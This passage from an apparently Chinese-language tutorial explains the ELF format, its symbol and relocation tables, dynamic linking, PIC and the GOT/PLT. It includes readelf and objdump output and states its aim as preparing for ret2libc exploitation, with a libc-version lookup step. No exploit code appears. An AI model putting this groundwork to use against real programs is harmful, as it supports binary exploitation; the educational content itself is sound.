<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SHF_WRITE</td>
<td align="left">1</td>
<td align="left">表示该节在进程空间中可写</td>
</tr>
<tr>
<td align="left">SHF_ALLOC</td>
<td align="left">2</td>
<td align="left">表示该节在进程空间中需要分配空间。有些包含指示或控制信息的节不需要在进程空间中分配空间，就不会有这个标志。</td>
</tr>
<tr>
<td align="left">SHF_EXECINSTR</td>
<td align="left">4</td>
<td align="left">表示该节在进程空间中可以被执行</td>
</tr>
</tbody></table>
<h3 id="2-3-3-sh-link、sh-info（节链接信息）"><a href="#2-3-3-sh-link、sh-info（节链接信息）" class="headerlink" title="2.3.3 sh_link、sh_info（节链接信息）"></a>2.3.3 sh_link、sh_info（节链接信息）</h3><p>如果节的类型是与链接相关的（无论是动态链接还是静态链接），如<strong>重定位表、符号表、</strong>等，则<code>sh_link</code>、<code>sh_info</code>两个成员所包含的意义如下所示。其他类型的节，这两个成员没有意义。</p>
<table>
<thead>
<tr>
<th align="left">sh_type</th>
<th align="left">sh_link</th>
<th align="left">sh_info</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SHT_DYNAMIC</td>
<td align="left">该节所使用的<strong>字符串表</strong>在节头表中的下标</td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">SHT_HASH</td>
<td align="left">该节所使用的<strong>符号表</strong>在节头表中的下标</td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">SHT_REL</td>
<td align="left">该节所使用的<strong>相应符号表</strong>在节头表中的下标</td>
<td align="left">该重定位表所作用的节在节头表中的下标</td>
</tr>
<tr>
<td align="left">SHT_RELA</td>
<td align="left">该节所使用的<strong>相应符号表</strong>在节头表中的下标</td>
<td align="left">该重定位表所作用的节在节头表中的下标</td>
</tr>
<tr>
<td align="left">SHT_SYMTAB</td>
<td align="left">操作系统相关</td>
<td align="left">操作系统相关</td>
</tr>
<tr>
<td align="left">SHT_DYNSYM</td>
<td align="left">操作系统相关</td>
<td align="left">操作系统相关</td>
</tr>
<tr>
<td align="left">other</td>
<td align="left">SHN_UNDEF</td>
<td align="left">0</td>
</tr>
</tbody></table>
<h2 id="2-4-Sections（节）"><a href="#2-4-Sections（节）" class="headerlink" title="2.4 Sections（节）"></a>2.4 Sections（节）</h2><p>上面简单介绍了节类型，接下来我们来看一些比较重要的节。</p>
<h3 id="2-4-1-节的分类"><a href="#2-4-1-节的分类" class="headerlink" title="2.4.1 节的分类"></a>2.4.1 节的分类</h3><h4 id="2-4-1-1-text-节"><a href="#2-4-1-1-text-节" class="headerlink" title="2.4.1.1 text 节"></a>2.4.1.1 text 节</h4><p><code>.text</code> 节是保存了程序代码指令的<strong>代码节</strong>。<strong>一段可执行程序，如果存在 phdr，则 <code>.text</code> 节就会存在于 <code>text</code> 段中</strong>。由于 <code>.text</code> 节保存了程序代码，所以节类型为 <code>SHT_PROGBITS</code>。</p>
<h4 id="2-4-1-2-rodata-节"><a href="#2-4-1-2-rodata-节" class="headerlink" title="2.4.1.2 .rodata 节"></a>2.4.1.2 .rodata 节</h4><p><code>rodata</code> 节保存了只读的数据，如一行 C 语言代码中的字符串。由于 <code>.rodata</code> 节是只读的，所以只能存在于一个可执行文件的<strong>只读段</strong>中。因此，只能在 <code>text</code> 段（不是 <code>data</code> 段）中找到 <code>.rodata</code> 节。由于 <code>.rodata</code> 节是只读的，所以节类型为 <code>SHT_PROGBITS</code>。</p>
<h4 id="2-4-1-3-plt-节（过程链接表）"><a href="#2-4-1-3-plt-节（过程链接表）" class="headerlink" title="2.4.1.3 .plt 节（过程链接表）"></a>2.4.1.3 .plt 节（过程链接表）</h4><p><code>.plt</code> 节也称为<strong>过程链接表（Procedure Linkage Table）</strong>，<strong>其包含了动态链接器调用从共享库导入的函数所必需的相关代码</strong>。由于 <code>.plt</code> 节保存了代码，所以节类型为 <code>SHT_PROGBITS</code>。</p>
<h4 id="2-4-1-4-data-节"><a href="#2-4-1-4-data-节" class="headerlink" title="2.4.1.4 .data 节"></a>2.4.1.4 .data 节</h4><p><code>.data</code> 节存在于 <code>data</code> 段中，<strong>其保存了初始化的全局变量等数据</strong>，会在程序的内存映像中出现。由于 <code>.data</code> 节保存了程序的变量数据，所以节类型为 <code>SHT_PROGBITS</code>。</p>
<h4 id="2-4-1-5-bss-节"><a href="#2-4-1-5-bss-节" class="headerlink" title="2.4.1.5 .bss 节"></a>2.4.1.5 .bss 节</h4><p><code>.bss</code> 节存在于 <code>data</code> 段中，占用空间不超过 4 字节，仅表示这个节本身的空间。**<code>.bss</code> 节保存了未进行初始化的全局数据**。程序加载时数据被初始化为 0，在程序执行期间可以进行赋值。由于 <code>.bss</code> 节未保存实际的数据，所以节类型为 <code>SHT_NOBITS</code>。</p>
<h4 id="2-4-1-6-got-plt-节（全局偏移表-过程链接表）"><a href="#2-4-1-6-got-plt-节（全局偏移表-过程链接表）" class="headerlink" title="2.4.1.6 .got.plt 节（全局偏移表 - 过程链接表）"></a>2.4.1.6 .got.plt 节（全局偏移表 - 过程链接表）</h4><p><code>.got</code> 节保存了<strong>全局偏移表</strong>。**<code>.got</code> 节和 <code>.plt</code> 节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改**。由于 <code>.got.plt</code> 节与程序执行有关，所以节类型为 <code>SHT_PROGBITS</code>。</p>
<h4 id="1-4-7-dynsym-节（动态链接符号表）"><a href="#1-4-7-dynsym-节（动态链接符号表）" class="headerlink" title="1.4.7 .dynsym 节（动态链接符号表）"></a>1.4.7 .dynsym 节（动态链接符号表）</h4><p><code>.dynsym</code> 节保存在 <code>text</code> 段中。<strong>其保存了从共享库导入的动态符号表</strong>。节类型为 <code>SHT_DYNSYM</code>。</p>
<h4 id="2-4-1-8-dynstr-节（动态链接字符串表）"><a href="#2-4-1-8-dynstr-节（动态链接字符串表）" class="headerlink" title="2.4.1.8 .dynstr 节（动态链接字符串表）"></a>2.4.1.8 .dynstr 节（动态链接字符串表）</h4><p><code>.dynstr</code> 保存了动态链接字符串表，表中存放了一系列字符串，这些字符串代表了符号名称，以空字符作为终止符。</p>
<h4 id="2-4-1-9-rel-节（重定位表）"><a href="#2-4-1-9-rel-节（重定位表）" class="headerlink" title="2.4.1.9 .rel.* 节（重定位表）"></a>2.4.1.9 .rel.* 节（重定位表）</h4><p>重定位表保存了重定位相关的信息，<strong>这些信息描述了如何在链接或运行时，对ELF目标文件的某部分或者进程镜像进行补充或修改</strong>。由于重定位表保存了重定位相关的数据，所以节类型为 <code>SHT_REL</code>。</p>
<h4 id="2-4-1-10-hash-节"><a href="#2-4-1-10-hash-节" class="headerlink" title="2.4.1.10 .hash 节"></a>2.4.1.10 .hash 节</h4><p><code>.hash</code> 节也称为 <code>.gnu.hash</code>，其保存了一个用于查找符号的散列表。</p>
<h4 id="2-4-1-11-symtab-节（符号表）"><a href="#2-4-1-11-symtab-节（符号表）" class="headerlink" title="2.4.1.11 .symtab 节（符号表）"></a>2.4.1.11 .symtab 节（符号表）</h4><p><code>.symtab</code> 节是一个<code>ElfN_Sym</code> 的数组，保存了符号信息。节类型为<code>SHT_SYMTAB</code>。</p>
<h4 id="2-4-1-12-strtab-节（字符串表）"><a href="#2-4-1-12-strtab-节（字符串表）" class="headerlink" title="2.4.1.12 .strtab 节（字符串表）"></a>2.4.1.12 .strtab 节（字符串表）</h4><p><code>.strtab</code> 节保存的是符号字符串表，表中的内容会被 <code>.symtab</code> 的 <code>ElfN_Sym</code> 结构中的 <code>st_name</code> 引用。节类型为 <code>SHT_STRTAB</code>。</p>
<h4 id="2-4-1-13-ctors-节和-dtors-节"><a href="#2-4-1-13-ctors-节和-dtors-节" class="headerlink" title="2.4.1.13 .ctors 节和 .dtors 节"></a>2.4.1.13 .ctors 节和 .dtors 节</h4><p><code>.ctors</code>（<strong>构造器</strong>）节和 <code>.dtors</code>（<strong>析构器</strong>）节分别保存了指向构造函数和析构函数的函数指针，<strong>构造函数是在main函数执行之前需要执行的代码；析构函数是在main函数之后需要执行的代码</strong>。</p>
<h3 id="2-4-2-符号表"><a href="#2-4-2-符号表" class="headerlink" title="2.4.2 符号表"></a>2.4.2 符号表</h3><p>使用 <code>readelf -s</code> 命令可以查看符号表的内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">readelf -s  helloworld</span></span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.dynsym&#x27; contains 7 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.34 (2)</span><br><span class="line">     2: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (3)</span><br><span class="line">     4: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     5: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">     6: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.2.5 (3)</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 36 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS Scrt1.o</span><br><span class="line">     2: 000000000000038c    32 OBJECT  LOCAL  DEFAULT    4 __abi_tag</span><br><span class="line">     3: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">     4: 0000000000001090     0 FUNC    LOCAL  DEFAULT   16 deregister_tm_clones</span><br><span class="line">     5: 00000000000010c0     0 FUNC    LOCAL  DEFAULT   16 register_tm_clones</span><br><span class="line">     6: 0000000000001100     0 FUNC    LOCAL  DEFAULT   16 __do_global_dtors_aux</span><br><span class="line">     7: 0000000000004010     1 OBJECT  LOCAL  DEFAULT   26 completed.0</span><br><span class="line">     8: 0000000000003dc0     0 OBJECT  LOCAL  DEFAULT   22 __do_global_dtor[...]</span><br><span class="line">     9: 0000000000001140     0 FUNC    LOCAL  DEFAULT   16 frame_dummy</span><br><span class="line">    10: 0000000000003db8     0 OBJECT  LOCAL  DEFAULT   21 __frame_dummy_in[...]</span><br><span class="line">    11: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS helloworld.c</span><br><span class="line">    12: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    13: 00000000000020f0     0 OBJECT  LOCAL  DEFAULT   20 __FRAME_END__</span><br><span class="line">    14: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS </span><br><span class="line">    15: 0000000000003dc8     0 OBJECT  LOCAL  DEFAULT   23 _DYNAMIC</span><br><span class="line">    16: 0000000000002014     0 NOTYPE  LOCAL  DEFAULT   19 __GNU_EH_FRAME_HDR</span><br><span class="line">    17: 0000000000003fb8     0 OBJECT  LOCAL  DEFAULT   24 _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    18: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]</span><br><span class="line">    19: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">    20: 0000000000004000     0 NOTYPE  WEAK   DEFAULT   25 data_start</span><br><span class="line">    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5</span><br><span class="line">    22: 0000000000004010     0 NOTYPE  GLOBAL DEFAULT   25 _edata</span><br><span class="line">    23: 0000000000001168     0 FUNC    GLOBAL HIDDEN    17 _fini</span><br><span class="line">    24: 0000000000004000     0 NOTYPE  GLOBAL DEFAULT   25 __data_start</span><br><span class="line">    25: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">    26: 0000000000004008     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle</span><br><span class="line">    27: 0000000000002000     4 OBJECT  GLOBAL DEFAULT   18 _IO_stdin_used</span><br><span class="line">    28: 0000000000004018     0 NOTYPE  GLOBAL DEFAULT   26 _end</span><br><span class="line">    29: 0000000000001060    38 FUNC    GLOBAL DEFAULT   16 _start</span><br><span class="line">    30: 0000000000004010     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start</span><br><span class="line">    31: 0000000000001149    30 FUNC    GLOBAL DEFAULT   16 main</span><br><span class="line">    32: 0000000000004010     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__</span><br><span class="line">    33: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">    34: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@G[...]</span><br><span class="line">    35: 0000000000001000     0 FUNC    GLOBAL HIDDEN    12 _init</span><br></pre></td></tr></table></figure>

<p>符号表使用的结构体为 <code>elf64_sym</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_sym</span> &#123;</span></span><br><span class="line">  Elf64_Word st_name;		<span class="comment">/* Symbol name, index in string tbl */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;	<span class="comment">/* Type and binding attributes */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;	<span class="comment">/* No defined meaning, 0 */</span></span><br><span class="line">  Elf64_Half st_shndx;		<span class="comment">/* Associated section index */</span></span><br><span class="line">  Elf64_Addr st_value;		<span class="comment">/* Value of the symbol */</span></span><br><span class="line">  Elf64_Xword st_size;		<span class="comment">/* Associated symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>

<p>对于各字段的解释如下</p>
<table>
<thead>
<tr>
<th align="left">成员</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">st_name</td>
<td align="left">符号名。该值为该符号名在字符串表中的偏移地址。</td>
</tr>
<tr>
<td align="left">st_value</td>
<td align="left">符号对应的值。存放符号的值（可能是地址或位置偏移量）。</td>
</tr>
<tr>
<td align="left">st_size</td>
<td align="left">符号的大小。</td>
</tr>
<tr>
<td align="left">st_other</td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">st_shndx</td>
<td align="left">符号所在的节</td>
</tr>
<tr>
<td align="left">st_info</td>
<td align="left">符号类型及绑定属性</td>
</tr>
</tbody></table>
<p><strong>符号是对某些类型的数据或代码（如全局变量或函数）的符号引用，函数名或变量名就是符号名</strong>。例如，<code>printf()</code> 函数会在动态链接符号表 <code>.dynsym</code> 中存有一个指向该函数的符号项（以 <code>Elf_Sym</code> 数据结构表示）。在大多数共享库和动态链接可执行文件中，存在两个符号表。即 <code>.dynsym</code> 和 <code>.symtab</code>。</p>
<p><strong><code>.dynsym</code> 保存了引用来自外部文件符号的全局符号</strong>。如 <code>printf</code> 库函数。**<code>.dynsym</code> 保存的符号是 <code>.symtab</code> 所保存符合的子集，<code>.symtab</code> 中还保存了可执行文件的本地符号**。如全局变量，代码中定义的本地函数等。</p>
<p>通过 <code>readelf -S</code> 命令可以查看可执行文件的输出，一部分节标志位（ <code>sh_flags</code> ）被标记为了<strong>A（ALLOC）、WA（WRITE&#x2F;ALLOC）、AX（ALLOC&#x2F;EXEC）</strong>。其中，<code>.dynsym</code> 被标记为 ALLOC，而 <code>.symtab</code> 则没有标记。</p>
<p>ALLOC 表示有该标记的节会在运行时分配并装载进入内存，而 <code>.symtab</code> 不是在运行时必需的，因此不会被装载到内存中。**<code>.dynsym</code> 保存的符号只能在运行时被解析，因此是运行时动态链接器所需的唯一符号**。<code>.dynsym</code> 对于动态链接可执行文件的执行是必需的，而 <code>.symtab</code> 只是用来进行调试和链接的。</p>
<h3 id="2-4-3-字符串表"><a href="#2-4-3-字符串表" class="headerlink" title="2.4.3 字符串表"></a>2.4.3 字符串表</h3><p>类似于符号表，在大多数共享库和动态链接可执行文件中，也存在两个字符串表。即 <code>.dynstr</code> 和 <code>.strtab</code>，分别对应于 <code>.dynsym</code> 和 <code>symtab</code>。此外，还有一个 <code>.shstrtab</code> 的节头字符串表，用于保存节头表中用到的字符串，可通过 <code>sh_name</code> 进行索引。</p>
<p>ELF文件中所有字符表的结构基本一致，如上图所示。</p>
<h3 id="2-4-4-重定位表"><a href="#2-4-4-重定位表" class="headerlink" title="2.4.4 重定位表"></a>2.4.4 重定位表</h3><p><strong>重定位就是将符号定义和符号引用进行连接的过程</strong>。可重定位文件需要包含描述如何修改节内容的相关信息，从而使可执行文件和共享目标文件能够保存进程的程序镜像所需要的正确信息。</p>
<p>重定位表是进行重定位的重要依据。我们可以使用 objdump 工具查看目标文件的重定位表：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">readelf -r helloworld</span></span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rela.dyn&#x27; at offset 0x550 contains 8 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000003db8  000000000008 R_X86_64_RELATIVE                    1140</span><br><span class="line">000000003dc0  000000000008 R_X86_64_RELATIVE                    1100</span><br><span class="line">000000004008  000000000008 R_X86_64_RELATIVE                    4008</span><br><span class="line">000000003fd8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0</span><br><span class="line">000000003fe0  000200000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0</span><br><span class="line">000000003fe8  000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0</span><br><span class="line">000000003ff0  000500000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0</span><br><span class="line">000000003ff8  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rela.plt&#x27; at offset 0x610 contains 1 entry:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000003fd0  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0</span><br></pre></td></tr></table></figure>

<p>重定位表是一个<code>Elf_Rel</code>类型的数组结构，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_rel</span> &#123;</span></span><br><span class="line">  Elf64_Addr r_offset;	<span class="comment">/* Location at which to apply the action */</span></span><br><span class="line">  Elf64_Xword r_info;	<span class="comment">/* index and type of relocation */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">成员</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">r_offset</td>
<td align="left">重定位入口的偏移。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">对于<strong>可重定位文件</strong>来说，这个值是该重定位入口所要修正的位置的第一个字节相对于节起始的偏移</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">对于<strong>可执行文件或共享对象文件</strong>来说，这个值是该重定位入口所要修正的位置的第一个字节的虚拟地址</td>
</tr>
<tr>
<td align="left">r_info</td>
<td align="left">重定位入口的类型和符号</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">因为不同处理器的指令系统不一样，所以重定位所要修正的指令地址格式也不一样。每种处理器都有自己的一套重定位入口的类型。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">对于<strong>可执行文件和共享目标文件</strong>来说，它们的重定位入口是动态链接类型的。</td>
</tr>
</tbody></table>
<p>重定位是目标文件链接成为可执行文件的关键。根据偏移地址获取到程序使用到的链接库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./find puts dc0</span></span><br><span class="line">ubuntu-glibc (libc6-i386_2.38-1ubuntu4_amd64)</span><br></pre></td></tr></table></figure>

<h1 id="3-动态链接"><a href="#3-动态链接" class="headerlink" title="3. 动态链接"></a>3. 动态链接</h1><p>动态链接（Dynamic Linking）是一种在程序运行时将不同模块（通常是库文件）组合在一起的技术。与静态链接相对，动态链接将链接的过程延迟到程序运行时，而不是在编译时进行。</p>
<p>在动态链接中，程序会引用外部的共享库（也称为动态链接库或共享对象），这些库包含了一些可重用的代码和数据，供多个程序共享使用。当一个程序需要使用某个库时，它会在运行时通过动态链接器（dynamic linker）将该库加载到内存中，并将程序的代码与库中的函数和数据进行链接。</p>
<p>与静态链接相比的优点：</p>
<ol>
<li><p>节省内存空间</p>
<p> 例如在当前磁盘上有 p1、p2 两个程序，这两个程序都调用了 lib.o 模块。在使用静态链接编译的情况下，在编译输出的可执行文件中都会包含 lib.o 这个模块。这样就会造成磁盘空间的浪费。当着两个程序同时运行时，内存中也将加载两份 lib.o 模块，这也造成了内存空间的浪费。而在动态链接的情况下，当 p1 程序在运行过程中发现需要调用到 lib.o 模块时且内存中没有加载时就会在内存中加载一份 lib.o 并进行调用。p2 程序运行时就不需要再向内存中加载一个 lib.o，直接调用即可</p>
</li>
<li><p>简化更新和维护</p>
<p> 如果上面提到的 lib.o 库需要更新或修复漏洞，静态链接编译的程序需要重新编译。动态链接编译的程序只需覆盖更新 lib.o 库本身，而不需要重新编译和链接所有引用了该库的程序。</p>
</li>
<li><p>加速程序启动</p>
<p> 由于库的代码已经被编译和链接，程序启动时只需加载库到内存中，而不需要再进行链接。</p>
</li>
</ol>
<p>Linux 系统中，<strong>ELF</strong> 动态链接文件被称为 <strong>动态共享对象（Dynamic Shared Objects）</strong>， 简称 <strong>共享对象</strong> 一般都是以 “.so” 为扩展名的文件。在 windows 系统中就是常常软件报错缺少 xxx.dll 文件。</p>
<p>了解完动态链接的工作原理。如果想要利用 ret2libc 中的共享对象执行指令还需要获取共享对象在内存中的地址。接下来了解下 <strong>装载时重定位</strong></p>
<h2 id="3-1-装载时重定位"><a href="#3-1-装载时重定位" class="headerlink" title="3.1 装载时重定位"></a>3.1 装载时重定位</h2><p>在动态链接过程中，<strong>装载时重定位</strong> 是一种将共享对象中的符号引用与目标程序中的符号定义进行关联的过程。这个过程确保了程序在运行时能够正确地调用共享对象中的函数或访问共享对象中的变量。</p>
<p>装载时重定位通常包括以下步骤：</p>
<ol>
<li><p>动态链接器加载共享对象到内存中，并为共享对象分配一块内存空间。 -&gt; 确定共享对象的加载基地址</p>
</li>
<li><p>动态链接器解析共享对象中的符号引用。这些符号引用可以是函数调用或变量访问等。</p>
</li>
<li><p>动态链接器通过共享对象中的符号表和重定位表等元数据信息，找到共享对象中对应的符号定义的地址。<strong>从符号表中找到的地址通常是相对于共享对象加载基地址的相对地址（相对地址由地址无关代码获取）</strong>，然后结合动态链接器为共享对象分配的基地址修正为绝对地址。</p>
</li>
<li><p>动态链接器使用找到的符号定义的地址，将共享对象中的符号引用重定位到目标程序中的对应位置。这可能涉及修改目标程序的指令或数据，以确保正确的调用和访问。</p>
</li>
</ol>
<p>在<strong>装载时重定位</strong>的情况下，共享对象的指令部分无法在多个进程之间共享。这是因为指令部分包含了共享对象中的代码，而代码通常是以只读形式存在，并且与特定的进程上下文相关联。共享对象的数据部分（如全局变量）可以在多个进程之间共享，因为数据可以在不同的进程之间共享内存空间。这使得多个进程可以访问共享对象中的相同数据，以实现信息共享和通信。</p>
<h2 id="3-2-地址无关代码"><a href="#3-2-地址无关代码" class="headerlink" title="3.2 地址无关代码"></a>3.2 地址无关代码</h2><p>基于上述的这种特性诞生了<strong>地址无关代码 （PIC，Position-independent Code）</strong> 技术，<strong>地址无关代码</strong> 生成的内容存储在数据部分，使用相对地址或符号偏移量来访问指令和数据，而不依赖于特定的加载地址。这使得地址无关代码可以被加载到任意的内存地址，并在不同的地址空间中正确地执行。该。</p>
<p>地址无关代码的实现通常涉及以下几个关键技术：</p>
<ol>
<li><p>相对寻址：使用相对地址寻址方式，代码中的指令和数据的访问是相对于当前指令的位置或基地址的偏移量。这样，在加载时只需计算偏移量即可，而不需要修改指令中的绝对地址。</p>
</li>
<li><p>全局偏移表（GOT）：全局偏移表是一个数据结构，用于存储代码中需要访问的全局变量或外部函数的地址偏移量。在加载时，动态链接器会填充这个表，并将其中的偏移量转换为正确的绝对地址。这样可以使得代码在不同的内存地址空间中加载时仍然能够正确地访问这些变量或函数。</p>
</li>
<li><p>过程链接表（PLT）：过程链接表是一个代码段，用于处理对外部函数的调用。在加载时，动态链接器会填充这个表，并将其中的偏移量转换为正确的绝对地址。</p>
</li>
</ol>
<p>简单而言<strong>地址无关代码</strong>通过相对引用和装载时重定位等方式，使代码可以在任意位置加载运行。</p>
<h2 id="3-3-代码示例"><a href="#3-3-代码示例" class="headerlink" title="3.3 代码示例"></a>3.3 代码示例</h2><p>接下来使用代码来实际演示下该过程</p>
<ul>
<li><strong>共享文件 got_extern.c</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译成 32 位共享对象文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc got_extern.c -fPIC -shared -m32 -o got_extern.so</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>-fPIC</code>：生成位置无关代码。</p>
</li>
<li><p><code>-shared</code>：生成一个共享对象文件。</p>
</li>
<li><p><code>-m32</code>：生成32位的目标代码。</p>
</li>
</ul>
<blockquote>
<p>gcc 中还有另一个 -fpic 选项，差别是 fPIC 产生的代码较大但是跨平台性较强而 fpic 产生的代码较小，且生成速度更快但是在不同平台中会有限制。一般会采用 fPIC 选项</p>
</blockquote>
<ul>
<li><strong>代码模块 got.c</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line">​  </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> a;  </span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> b;  </span><br><span class="line">​  </span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>;  </span><br><span class="line">​  </span><br><span class="line"><span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span> &#123;  </span><br><span class="line">    a = <span class="number">1</span>;  </span><br><span class="line">    b = <span class="number">2</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span> &#123;  </span><br><span class="line">    fun();  </span><br><span class="line">    test();  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hey!&quot;</span>);  </span><br><span class="line">​  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和共享模块一起编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc got.c ./got_extern.so -m32 -o got</span></span><br></pre></td></tr></table></figure>

<p>用 objdump 查看反汇编代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -D -Mintel got &gt; got.txt</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>-D</code>：以反汇编的形式显示目标文件的内容。</p>
</li>
<li><p><code>-Mintel</code>：指定使用 Intel 格式的汇编语法来显示反汇编结果。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000011ad &lt;fun&gt;:  </span><br><span class="line">    11ad:   55                   push   ebp  </span><br><span class="line">    11ae:   89 e5                mov    ebp,esp  </span><br><span class="line">    11b0:   e8 63 00 00 00       call   1218 &lt;__x86.get_pc_thunk.ax&gt;  </span><br><span class="line">    11b5:   05 1b 2e 00 00       add    eax,0x2e1b  </span><br><span class="line">    11ba:   c7 80 3c 00 00 00 01 mov    DWORD PTR [eax+0x3c],0x1  </span><br><span class="line">    11c1:   00 00 00   </span><br><span class="line">    11c4:   8b 80 1c 00 00 00    mov    eax,DWORD PTR [eax+0x1c]  </span><br><span class="line">    11ca:   c7 00 02 00 00 00    mov    DWORD PTR [eax],0x2  </span><br><span class="line">    11d0:   90                   nop  </span><br><span class="line">    11d1:   5d                   pop    ebp  </span><br><span class="line">    11d2:   c3                   ret      </span><br><span class="line">​  </span><br><span class="line">000011d3 &lt;main&gt;:  </span><br><span class="line">    11d3:   8d 4c 24 04          lea    ecx,[esp+0x4]  </span><br><span class="line">    11d7:   83 e4 f0             and    esp,0xfffffff0  </span><br><span class="line">    11da:   ff 71 fc             push   DWORD PTR [ecx-0x4]  </span><br><span class="line">    11dd:   55                   push   ebp  </span><br><span class="line">    11de:   89 e5                mov    ebp,esp  </span><br><span class="line">    11e0:   53                   push   ebx  </span><br><span class="line">    11e1:   51                   push   ecx  